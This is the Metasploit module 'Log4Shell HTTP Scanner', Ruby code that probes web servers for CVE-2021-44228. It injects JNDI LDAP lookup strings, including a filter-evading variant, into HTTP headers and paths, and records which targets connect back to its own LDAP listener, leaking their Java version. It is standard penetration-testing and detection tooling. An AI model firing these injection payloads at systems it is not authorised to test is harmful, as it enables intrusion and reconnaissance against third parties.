##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::LDAP::Server
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Log4Shell HTTP Scanner',
      'Description' => %q{
        Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration,
        log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints.

        This module will scan an HTTP end point for the Log4Shell vulnerability by injecting a format message that will
        trigger an LDAP connection to Metasploit. This module is a generic scanner and is only capable of identifying
        instances that are vulnerable via one of the pre-determined HTTP request injection points. These points include
        HTTP headers and the HTTP request path.

        Known impacted software includes Apache Struts 2, VMWare VCenter, Apache James, Apache Solr, Apache Druid,
        Apache JSPWiki, Apache OFBiz.
      },
      'Author' => [
        'Spencer McIntyre', # The fun stuff
        'RageLtMan <rageltman[at]sempervictus>', # Some plumbing
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
        [ 'CVE', '2021-45046' ],
        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis' ],
        [ 'URL', 'https://logging.apache.org/log4j/2.x/security.html' ]
      ],
      'DisclosureDate' => '2021-12-09',
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => []
      }
    )

    register_options([
      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
      OptPath.new(
        'HEADERS_FILE',
        [
          false,
          'File containing headers to check',
          File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_headers.txt')
        ]
      ),
      OptPath.new(
        'URIS_FILE',
        [
          false,
          'File containing additional URIs to check',
          File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_uris.txt')
        ]
      ),
      OptInt.new('LDAP_TIMEOUT', [ true, 'Time in seconds to wait to receive LDAP connections', 30 ])
    ])
  end

  def jndi_string(resource)
    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
  end

  #
  # Handle incoming requests via service mixin
  #
  def on_dispatch_request(client, data)
    return if data.strip.empty?

    data.extend(Net::BER::Extensions::String)
    begin
      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
      vprint_status("LDAP request data remaining: #{data}") if !data.empty?
      resp = case pdu.app_tag
             when Net::LDAP::PDU::BindRequest # bind request
               client.authenticated = true
               service.encode_ldap_response(
                 pdu.message_id,
                 Net::LDAP::ResultCodeSuccess,
                 '',
                 '',
                 Net::LDAP::PDU::BindResult
               )
             when Net::LDAP::PDU::SearchRequest # search request
               if client.authenticated || datastore['LDAP_AUTH_BYPASS']
                 # Perform query against some loaded LDIF structure
                 treebase = pdu.search_parameters[:base_object].to_s
                 token, java_version = treebase.split('/', 2)
                 target_info = @mutex.synchronize { @tokens.delete(token) }
                 if target_info
                   details = normalize_uri(target_info[:target_uri]).to_s
                   details << " (header: #{target_info[:headers].keys.first})" unless target_info[:headers].nil?
                   details << " (java: #{java_version})" unless java_version.blank?
                   peerinfo = "#{target_info[:rhost]}:#{target_info[:rport]}"
                   print_good("#{peerinfo.ljust(21)} - Log4Shell found via #{details}")
                   report_vuln(
                     host: target_info[:rhost],
                     port: target_info[:rport],
                     info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
                     name: name,
                     refs: references
                   )
                 end
                 nil
               else
                 service.encode_ldap_response(pdu.message_id, 50, '', 'Not authenticated', Net::LDAP::PDU::SearchResult)
               end
             else
               vprint_status("Client sent unexpected request #{tag}")
               client.close
             end
      resp.nil? ? client.close : on_send_response(client, resp)
    rescue StandardError => e
      print_error("Failed to handle LDAP request due to #{e}")
      client.close
    end
    resp
  end

  def rand_text_alpha_lower_numeric(len, bad = '')
    foo = []
    foo += ('a'..'z').to_a
    foo += ('0'..'9').to_a
    Rex::Text.rand_base(len, bad, *foo)
  end

  def run
    fail_with(Failure::BadConfig, 'The SRVHOST option must be set to a routable IP address.') if ['0.0.0.0', '::'].include?(datastore['SRVHOST'])
    @mutex = Mutex.new
    @tokens = {}
    begin
      start_service
    rescue Rex::BindFailed => e
      fail_with(Failure::BadConfig, e.to_s)
    end

    super

    print_status("Sleeping #{datastore['LDAP_TIMEOUT']} seconds for any last LDAP connections")
    sleep datastore['LDAP_TIMEOUT']
  ensure
    stop_service
  end

  def replicant
    #
    # WARNING: This is a horrible pattern and should not be copy-pasted into new code. A better solution is currently
    # in the works to address service / socket replication as it affects scanner modules.
    #
    service = @service
    @service = nil
    obj = super
    @service = service

    # but do copy the tokens and mutex to the new object
    obj.mutex = @mutex
    obj.tokens = @tokens
    obj
  end

  def run_host(ip)
    # probe the target before continuing
    return if send_request_cgi('uri' => normalize_uri(target_uri)).nil?

    run_host_uri(ip, normalize_uri(target_uri)) unless target_uri.blank?

    return if datastore['URIS_FILE'].blank?

    File.open(datastore['URIS_FILE'], 'rb').each_line(chomp: true) do |uri|
      next if uri.blank? || uri.start_with?('#')

      if uri.include?('${jndi:uri}')
        token = rand_text_alpha_lower_numeric(8..32)
        jndi = jndi_string(token)
        uri.delete_prefix!('/')
        test(token, uri: normalize_uri(target_uri, '') + uri.gsub('${jndi:uri}', Rex::Text.uri_encode(jndi)))
      else
        run_host_uri(ip, normalize_uri(target_uri, uri))
      end
    end
  end

  def run_host_uri(_ip, uri)
    unless datastore['HEADERS_FILE'].blank?
      headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
      headers_file.each_line(chomp: true) do |header|
        next if header.blank? || header.start_with?('#')

        token = rand_text_alpha_lower_numeric(8..32)
        test(token, uri: uri, headers: { header => jndi_string(token) })
      end
    end

    token = rand_text_alpha_lower_numeric(8..32)
    jndi = jndi_string(token)
    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/')), '/'))

    token = rand_text_alpha_lower_numeric(8..32)
    jndi = jndi_string(token)
    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/'))))
  end

  def test(token, uri: nil, headers: nil)
    target_info = {
      rhost: rhost,
      rport: rport,
      target_uri: uri,
      headers: headers
    }
    @mutex.synchronize { @tokens[token] = target_info }

    send_request_raw(
      'uri' => uri,
      'method' => datastore['HTTP_METHOD'],
      'headers' => headers
    )
  end

  attr_accessor :mutex, :tokens
end
